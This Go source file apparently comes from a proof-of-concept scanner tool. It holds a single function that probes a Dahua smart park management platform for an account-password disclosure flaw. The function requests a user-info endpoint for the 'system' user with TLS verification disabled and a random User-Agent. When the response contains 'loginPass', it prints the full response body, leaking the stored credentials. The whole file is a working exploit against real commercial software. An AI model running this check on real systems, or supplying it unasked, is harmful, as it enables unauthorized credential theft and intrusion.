package poc

import (
	"PocSir/config"
	"crypto/tls"
	"io"
	"net/http"
	"strings"
	"time"
)

func DaHua_sys_user(target string) {
	pocUrl := target + "/admin/user_getUserInfoByUserName.action?userName=system"
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	headers := map[string]string{
		"User-Agent": getRandUa(),
	}
	request, err := http.NewRequest("GET", pocUrl, nil)
	if err != nil {
		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
		return
	}
	for key, value := range headers {
		request.Header.Set(key, value)
	}
	resp, err := client.Do(request)
	if err != nil {
		config.ErrMsg.Printf("[-]%s is timeout\n", target)
		return
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == http.StatusOK && strings.Contains(string(data), "loginPass") {
		config.Right.Printf("[+]%s存在大华智慧园区综合管理平台账号密码泄漏漏洞\n", target)
		config.TextPut.Printf(string(data) + "\n")
	} else {
		config.ErrMsg.Printf("[-]%s不存在大华智慧园区综合管理平台账号密码泄漏漏洞\n", target)
	}
}
